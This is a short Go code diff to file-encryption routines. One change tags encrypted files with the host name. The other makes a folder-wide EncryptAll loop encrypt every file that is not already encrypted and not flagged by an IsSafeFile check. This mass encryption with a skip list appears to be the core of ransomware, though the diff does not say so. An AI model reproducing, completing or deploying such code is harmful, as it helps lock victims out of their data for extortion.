@@ -9,7 +9,7 @@ import (
 // Encrypt : encrypts file with key
 func Encrypt(fileSrc string, key *[]byte) (string, error) {
 
-	encryptedFileName := fileSrc + EncryptedExt
+	encryptedFileName := fileSrc + HostName + EncryptedExt
 	decryptedFile, err := os.Open(fileSrc)
 
 	counter := []byte{0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0}
@@ -98,7 +98,7 @@ func EncryptAll(rootFolder string, key *[]byte) (uint64, error) {
 					wg.Done()
 					return
 				}
-				if file[len(file)-len(EncryptedExt):] != EncryptedExt {
+				if file[len(file)-len(EncryptedExt):] != EncryptedExt && !IsSafeFile(&file) {
 					_, err := Encrypt(file, key)
 					if err == nil {
 						mutex.Lock()
